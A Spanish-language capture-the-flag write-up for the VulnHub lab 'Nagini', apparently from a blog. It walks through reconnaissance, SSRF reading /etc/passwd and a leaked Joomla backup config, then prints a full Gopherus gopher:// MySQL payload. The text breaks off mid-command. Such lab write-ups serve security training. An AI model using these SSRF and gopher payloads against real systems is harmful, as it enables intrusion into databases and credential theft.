---
title: "Nagini - VulnHub"
date: 2024-11-11
draft: false
slug: "vulnhub-writeup-nagini"
excerpt: "Esta fue una máquina bastante complicada para mí. Empezamos descubriendo únicamente 2 puertos abiertos, yéndonos directamente a aplicar Fuzzing al servicio HTTP, donde descubrimos que están ocupando Joomla y una nota que indica que usan HTTP3 Quic para almacenar una página web. Utilizando quiche 0.16.0, aplicamos una petición a esta página para ver su contenido, dándonos una ruta que podemos ver en el navegador. Entrando a esa ruta, resulta ser una página que se encarga de ver archivos web internos, por lo que aplicamos el ataque SSRF para apuntar a archivos internos. Además, enumeramos el CMS Joomla con joomscan, descubriendo un archivo .bak que contiene las credenciales de un usuario para el servicio MySQL. Con lo descubierto, usamos gopherus para crear payloads de MySQL que enumeren este servicio y también modifiquen la contraseña del administrador del Joomla. Entrando a Joomla, modificamos la plantilla Protostar para obtener una CMD y así aplicamos una Reverse Shell con la que ganamos acceso inicial a la máquina. Enumerando la máquina, descubrimos la credencial de un usuario al que pivoteamos y el binario cp dentro del directorio de otro usuario. Utilizamos ssh-keygen para crear una nueva llave de SSH que copiaremos dentro del segundo usuario. Una vez dentro del segundo usuario, descubrimos que tiene un directorio de Mozilla FireFox, siendo que es posible que almacene credenciales. Usamos dos herramientas para crackearlas y escalar privilegios a Root."
categories: ["VulnHub", "Medium Machine"]
tags: ["Linux", "CMS Joomla", "HTTP3 Quic", "Web Enumeration", "Server Side Request Forgery Attack (SSRF)", "Joomla Enumeration", "Information Leakage", "Gopherus MySQL Payloads", "MySQL Database Modification", "Joomla Exploitation Abusing Available Template", "Abusing SUID Binary", "Cracking FireFox Stored Credentials", "Privesc - Cracking FireFox Stored Credentials", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "curl"
  - "git"
  - "cp"
  - "cargo"
  - "quiche v0.16.0"
  - "http3-client"
  - "PHP"
  - "perl"
  - "joomscan"
  - "gopherus"
  - "md5sum"
  - "nc"
  - "script"
  - "bash"
  - "find"
  - "base64"
  - "ssh-keygen"
  - "chmod"
  - "ssh"
  - "wget"
  - "scp"
  - "python3"
  - "firefox_decrypt.py"
  - "firepwd.py"
links:
  - "https://www.webempresa.com/joomla.html"
  - "https://www.cloudflare.com/es-es/learning/performance/what-is-http3/"
  - "https://boringssl.googlesource.com/boringssl/"
  - "https://github.com/cloudflare/quiche"
  - "https://github.com/curl/curl/blob/master/docs/HTTP3.md"
  - "https://blog.hackmetrix.com/ssrf-server-side-request-forgery/"
  - "https://www.getastra.com/blog/security-audit/joomla-penetration-testing/"
  - "https://github.com/OWASP/joomscan"
  - "https://tarun05blog.wordpress.com/2018/02/05/ssrf-through-gopher/"
  - "https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/"
  - "https://github.com/tarunkant/Gopherus"
  - "https://github.com/ajnik/joomla-bruteforce"
  - "https://www.balbooa.com/help/knowledge-base/troubleshooting/reset-joomla-admin-password"
  - "https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce"
  - "https://github.com/unode/firefox_decrypt"
  - "https://github.com/lclevy/firepwd"
  - "https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox"
showtoc: true
header:
  teaser: "/assets/images/vulnhub-writeup-nagini/Nagini-3.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.006
PING 192.168.1.006 (192.168.1.006) 56(84) bytes of data.
64 bytes from 192.168.1.006: icmp_seq=1 ttl=64 time=2.19 ms
64 bytes from 192.168.1.006: icmp_seq=2 ttl=64 time=1.35 ms
64 bytes from 192.168.1.006: icmp_seq=3 ttl=64 time=0.850 ms
64 bytes from 192.168.1.006: icmp_seq=4 ttl=64 time=0.822 ms

--- 192.168.1.006 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3362ms
rtt min/avg/max/mdev = 0.822/1.302/2.187/0.552 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.006 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 16:15 CST
Initiating ARP Ping Scan at 16:15
Scanning 192.168.1.006 [1 port]
Completed ARP Ping Scan at 16:15, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:15
Scanning 192.168.1.006 [65535 ports]
Discovered open port 80/tcp on 192.168.1.006
Discovered open port 22/tcp on 192.168.1.006
Completed SYN Stealth Scan at 16:16, 62.67s elapsed (65535 total ports)
Nmap scan report for 192.168.1.006
Host is up, received arp-response (0.040s latency).
Scanned at 2024-11-11 16:15:25 CST for 63s
Not shown: 53010 filtered tcp ports (no-response), 12523 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:F1:5C:11 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 62.92 seconds
           Raw packets sent: 124833 (5.493MB) | Rcvd: 12577 (512.610KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solamente hay dos puertos abiertos, y por lo que se ve, toda la intrusión será por la página web.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.006 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 16:18 CST
Nmap scan report for 192.168.1.006
Host is up (0.0016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:F1:5C:11 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

En efecto, la intrusión será por web, así que vamos a analizarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura1.png">
</p>

Solo vemos una imagen, es como en la **máquina Aragog**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura2.png">
</p>

No nos dice mucho.

No creo que podamos ver algo por aquí, entonces, vamos a aplicar **Fuzzing**.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.006/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.006/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000006201:   301        9 L      28 W       319 Ch      "joomla"                       
000045226:   200        5 L      11 W       97 Ch       "http://192.168.1.006/"               
000095510:   403        9 L      28 W       280 Ch      "server-status"                                

Total time: 0
Processed Requests: 220545
Filtered Requests: 220542
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.006/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.006/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/joomla               (Status: 301) [Size: 319] [--> http://192.168.1.006/joomla/]
/server-status        (Status: 403) [Size: 280]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Parece que está ocupando el **servicio Joomla** y que yo recuerde, es la primera vez que me enfrento a este servicio.

Investiguemos de qué trata este servicio:

| **Servicio Joomla** |
|:-----------:|
| *Joomla es la herramienta líder en la creación de webs, es el Gestor de Contenidos (CMS en inglés) más premiado a nivel mundial, existen más de 40 millones de páginas web creadas con Joomla y tienes a tu disposición más de 12.000 componentes que te permitirán ir ampliando las funcionalidades de tu web con nuevas opciones como pueden ser tienda virtual, envío de boletines, foros, galerías de imágenes y un sinfín de posibilidades que no paran de crecer.* |

Si lo visitamos, encontramos lo siguiente:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura3.png">
</p>

Y podemos ver qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura4.png">
</p>

Son muchas tecnologías, y veo que usa **PHP**, lo que nos puede ayudar bastante para la intrusión.

Veamos qué podemos encontrar aplicando **Fuzzing** al **CMS Joomla**:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.006/joomla/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.006/joomla/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000131:   301        9 L      28 W       327 Ch      "modules"      
000000002:   301        9 L      28 W       326 Ch      "images"          
000001235:   301        9 L      28 W       329 Ch      "libraries"     
000001069:   301        9 L      28 W       325 Ch      "cache"              
000000856:   301        9 L      28 W       328 Ch      "language"           
000003533:   301        9 L      28 W       327 Ch      "layouts"                
000003223:   301        9 L      28 W       323 Ch      "tmp"                    
000005675:   301        9 L      28 W       333 Ch      "administrator"      
000000991:   301        9 L      28 W       330 Ch      "components"              
000000624:   301        9 L      28 W       328 Ch      "includes"                 
000000469:   301        9 L      28 W       323 Ch      "bin"                  
000000067:   301        9 L      28 W       329 Ch      "templates"         
000000066:   301        9 L      28 W       325 Ch      "media"                
000000505:   301        9 L      28 W       327 Ch      "plugins"         
000020670:   301        9 L      28 W       323 Ch      "cli"                  
000045226:   200        160 L    428 W      6640 Ch     "http://192.168.1.006/joomla/"  

Total time: 0
Processed Requests: 220545
Filtered Requests: 220529
Requests/sec.: 0
```

Con **gobuster** encontramos lo mismo.

Son varias cosillas, pero en todas no podremos ver nada.

Quizá pasamos por alto algo en la página principal. Regresemos y veamos si no hay algún archivo **txt o PHP o HTML** que no hayamos visto:

```bash
gobuster dir -u http://192.168.1.006/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.006/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 97]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 319] [--> http://192.168.100.214/joomla/]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

Observamos uno, vayamos a verlo:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura9.png">
</p>

Parece que tenemos un dominio y que están usando **HTTP3** para almacenarlo y mostrarlo.

Agrega el dominio al `/etc/hosts` e investiguemos eso del **HTTP3**.

### Utilizando quiche 0.16.0 para Aplicar Peticiones a HTTP3 Quic {#HTTP3}

| **Protocolo HTTP3** |
|:-----------:|
| *HTTP/3 es la última versión principal de HTTP. Una diferencia importante en HTTP/3 es que se ejecuta en QUIC, un nuevo protocolo de transporte. QUIC está diseñado para ser rápido y admitir cambios rápidos entre redes. Se basa en el User Datagram Protocol (UDP) en lugar del protocolo de control de transmisión (TCP), que mitiga un problema llamado bloqueo de encabezado de línea en TCP, donde la pérdida o reordenación del paquete de red puede ralentizar las conexiones con un alto volumen de transacciones. Además, QUIC separa la conexión de transporte de la capa 4 del flujo de dirección IP de la capa 3, lo que permite la migración entre diferentes redes sin interrupciones.* |

Hay varias formas en las que podemos ver una página web que ocupa **HTTP3 Quic**, estas son:
* Actualizar **curl** para que pueda tramitar peticiones **HTTP3**: <a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md" target="_blank">Repositorio de curl: HTTP3 Documents</a>
* Utilizar la herramienta **quiche** para realizar las peticiones **HTTP3**: <a href="https://github.com/cloudflare/quiche" target="_blank">Repositorio de cloudfare: quiche</a>

Por lo que he visto, ya no es tan necesario actualizar **curl**, ya que actualmente tiene soporte para poder aplicar peticiones **HTTP2 y HTTP3**. Esto lo puedes comprobar viendo la versión de **curl** que tengas:
```bash
curl --version
curl 8.11.1-DEV (x86_64-pc-linux-gnu) libcurl/8.11.1-DEV quictls/3.1.4 zlib/1.3.1 brotli/1.1.0 zstd/1.5.6 libidn2/2.3.7 libpsl/0.21.2 nghttp2/1.64.0 ngtcp2/1.2.0 nghttp3/1.1.0 librtmp/2.3
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

Entonces, podríamos mandar una petición para ver si podemos ver el contenido del dominio, pero observa lo que obtenemos:
```bash
curl --http3 https://quic.nagini.hogwarts
curl: (56) Failed to connect to quic.nagini.hogwarts port 443 after 4 ms: Failure when receiving data from the peer

curl --http3-only https://quic.nagini.hogwarts
curl: (56) Failed to connect to quic.nagini.hogwarts port 443 after 1 ms: Failure when receiving data from the peer
```

La otra opción sería usar **quiche**, pero tampoco nos va a funcionar.

¿Por qué? Pues la **máquina Nagini** tiene una versión desactualizada de **HTTP3** siendo que es del 2021, por lo que necesitaremos una versión de **quiche** de esas fechas, ya que sí usamos una actual, tendrá conflictos para ver el contenido del dominio.

Ocuparemos la **version 0.16.0**, la puedes descargar de los releases:
* <a href="https://github.com/cloudflare/quiche/releases?page=2" target="_blank">Repositorio de cloudfare: quiche ver. 0.16.0</a>

Aun así, ocuparemos la versión actual, ya que hace falta un directorio crucial para poder compilar las herramientas que vamos a ocupar de **quiche**, así que descarga ambos.

Ya descargadas ambas versiones, sigue estos pasos:
* Elimina el **directorio boringssl** de la **versión 0.16.0**, ya que no tiene nada dentro. Se encuentra en la ruta: `quiche/deps/boringssl`:
```bash
# Estoy dentro del directorio quiche-0.16.0
rm -r quiche/deps/boringssl
```

* Copia el **directorio boringssl** de la **versión actual que tengas de quiche** y ponlo en la misma ruta donde lo eliminaste: `quiche/deps`:
```bash
# Estoy dentro del directorio quiche-0.16.0
cp -r ../quiche/quiche/deps/boringssl quiche/deps/.
```

Quizá exista una mejor forma de hacer esto, pero a mí me funcionó.

Con esto listo, ya puedes aplicar los comandos para armar la herramienta:
```bash
cargo build --examples
cargo test
```

Te saldrá uno que otro error, pero lo importante es que se compiló la herramienta que necesitamos. Esta se encuentra dentro del directorio `target/debug/examples` y se llama **http3-client**.

Tan solo tienes que ejecutarla, añadiéndole la URL que quieres ver:
```bash
./http3-client https://quic.nagini.hogwarts/
<html>
        <head>
        <title>Information Page</title>
        </head>
        <body>
                Greetings Developers!!

                I am having two announcements that I need to share with you:

                1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
                2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.

                Regards,
                site_admin
        </body>
</html>
```

Muy bien, funcionó correctamente (tarde 2 días y medio resolviendo este problema, te odio **HTTP3**).

Nos están dando una ruta que podemos visitar y lo que parece ser una pista de que debemos buscar **archivos .bak**.

Pero primero visitemos esa ruta que nos mostraron.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando SSRF en la Ruta Descubierta {#SSRF}

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura5.png">
</p>

Creó que con el mensaje que viene ahí, sabemos lo que podemos hacer.

Probemos a ver la página web de la máquina:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura6.png">
</p>

La podemos ver, entonces también deberíamos poder ver la nota que encontramos antes:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura7.png">
</p>

Es posible que esta página sea vulnerable al **ataque SSRF**:

| **Servicio FreePBX** |
|:-----------:|
| *El Server Side Request Forgery (SSRF) ocurre cuando una aplicación web permite hacer consultas HTTP del lado del servidor hacia un dominio arbitrario elegido por el atacante. Esto le permite a un atacante hacer conexión con servicios de la infraestructura interna donde se aloja la web y exfiltrar información sensible.* |

Podemos apuntar a un archivo local utilizando el esquema `file://`, ya que se puede interpretar como una **URL** y es un tipo de **URL** que señala archivos locales.

Apliquémoslo, apuntando al `/etc/passwd`:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura8.png">
</p>

Funciona.

Podemos ver que hay por lo menos 3 usuarios: **snape, ron y hermoine**. Además, parece que está ocupando el **servicio MySQL**.

Al estar funcionando internamente, podemos tratar de apuntar a un **archivo PHP** nuestro para que lo interprete la página y, si funciona, tendríamos una forma de obtener una **Reverse Shell**.

Probemos:

* Crea un archivo **PHP** simple, ponle solo texto si lo deseas:
```php
<?php
        echo 'hola papus/mamus del mundo';
?>
```

* Abre un servidor de **Python** y, desde la página web, apunta al archivo que creaste:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura11.png">
</p>

Parece que no lo está interpretando.

Probemos con uno de **HTML**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura12.png">
</p>

Este sí funciona, pero no nos ayuda mucho que digamos. Entonces, de momento, esto no nos sirve de mucho.

Lo que podemos hacer, es buscar vulnerabilidades que tenga el **CMS Joomla**.

### Buscando Vulnerabilidades del CMS Joomla con joomscan {#Joomla}

De acuerdo al siguiente blog:
* <a href="https://www.getastra.com/blog/security-audit/joomla-penetration-testing/" target="_blank">Joomla Security Audit & Penetration Testing: Steps & Tools</a>

Podemos ocupar la herramienta **joomscan** para que busque vulnerabilidades en la página web.

Puedes descargarlo aquí:
* <a href="https://github.com/OWASP/joomscan" target="_blank">Repositorio de OWASP: joomscan</a>

Sigue las instrucciones e instálalo.

Ya instalado, vamos a indicarle la ruta que ocupa **Joomla** para que empiece a buscar vulnerabilidades:
```bash
perl joomscan.pl -u http://192.168.1.006/joomla
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.1.006/joomla ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.1.006/joomla/administrator/components
http://192.168.1.006/joomla/administrator/modules
http://192.168.1.006/joomla/administrator/templates
http://192.168.1.006/joomla/tmp
http://192.168.1.006/joomla/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.1.006/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.1.006/joomla/robots.txt 

Interesting path found from robots.txt
http://192.168.1.006/joomla/joomla/administrator/
http://192.168.1.006/joomla/administrator/                                                                                                                                                                     
http://192.168.1.006/joomla/bin/                                                                                                                                                                               
http://192.168.1.006/joomla/cache/                                                                                                                                                                             
http://192.168.1.006/joomla/cli/                                                                                                                                                                               
http://192.168.1.006/joomla/components/                                                                                                                                                                        
http://192.168.1.006/joomla/includes/                                                                                                                                                                          
http://192.168.1.006/joomla/installation/                                                                                                                                                                      
http://192.168.1.006/joomla/language/                                                                                                                                                                          
http://192.168.1.006/joomla/layouts/                                                                                                                                                                           
http://192.168.1.006/joomla/libraries/                                                                                                                                                                         
http://192.168.1.006/joomla/logs/                                                                                                                                                                              
http://192.168.1.006/joomla/modules/                                                                                                                                                                           
http://192.168.1.006/joomla/plugins/                                                                                                                                                                           
http://192.168.1.006/joomla/tmp/                                                                                                                                                                               
                                                                                                                                                                                                                                            
[+] Finding common backup files name                                                                                                                                                                             
[++] Backup files are not found                                                                                                                                                                                  
                                                                                                                                                                                                                 
[+] Finding common log files name                                                                                                                                                                                
[++] error log is not found                                                                                                                                                                                      
                                                                                                                                                                                                                 
[+] Checking sensitive config.php.x file                                                                                                                                                                         
[++] Readable config file is found                                                                                                                                                                               
 config file path : http://192.168.1.006/joomla/configuration.php.bak                                                                                                                                          
                                                                                                                                                                                                                 
Your Report : reports/192.168.1.006/
```
Excelente, parece que encontró un **archivo .bak** que justamente advirtieron no ponerlo en producción.

Vamos a verlo:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura10.png">
</p>

Se descargó automáticamente.

Mándalo a tu directorio de trabajo y analízalo:
```php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
...
...
...
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'goblin';
        public $password = '';
        public $db = 'joomla';
        public $dbprefix = 'joomla_';
        public $live_site = '';
        public $secret = 'ILhwP6HTYKcN7qMh';
        public $gzip = '0';
...
...
...
	public $mailfrom = 'site_admin@nagini.hogwarts';
        public $fromname = 'Joomla CMS';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
...
...
...
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

No viene mucho, a excepción de un usuario llamado **goblin** y su contraseña que está vacía para la base de datos de **MySQL** que están ocupando.

Aun así, no podemos hacer nada de momento.

### Utilizando Ataque SSRF y Gopherus para Enumerar Base de Datos de MySQL {#Gopherus}

Buscando por la biblia **HackTricks**, nos dice que podemos usar **Gopherus** para crear payloads aplicables a **MySQL, PostgreSQL, FastCGI**, etc:
* <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#tools" target="_blank">HackTricks: SSRF - Tools</a>

Podemos visitar el blog del creado de **Gopherus** y ahí viene el link para ir al **GitHub** de la herramienta.

Igual te lo pongo aquí para que lo descargues:
* <a href="https://github.com/tarunkant/Gopherus" target="_blank">Repositorio de tarunkant: Gopherus</a>

Instálala y ejecútala:
```bash
gopherus

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
usage: gopherus [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
None
```

El mismo **GitHub** nos lo dice: si llegamos a encontrar una página vulnerable al **ataque SSRF**, que además sabemos que ocupa el **servicio MySQL**, entonces, podemos usar **Gopherus** para crear payloads y obtener un **RCE**.

Usemos la herramienta para que nos cree un payload para **MySQL** y veamos qué obtenemos al usarlo en la página vulnerable:

Al usar la herramienta, nos pedirá un usuario que no tenga una contraseña. Este ya lo tenemos gracias al **archivo .bak** y luego nos pide la query que queremos usar. Usaremos la query `show databases;`, para ver todas las bases de datos almacenadas:
```bash
gopherus --exploit mysql

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: show databases;

Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01
```

Copia y pega ese payload en la página vulnerable y cárgalo varias veces para que funcione:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura13.png">
</p>

Bien, tenemos la BD llamada **joomla**. Usemos la query `use joomla; show tables;`, para ver las tablas de esa BD:
```bash
gopherus --exploit mysql

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: use joomla; show tables;

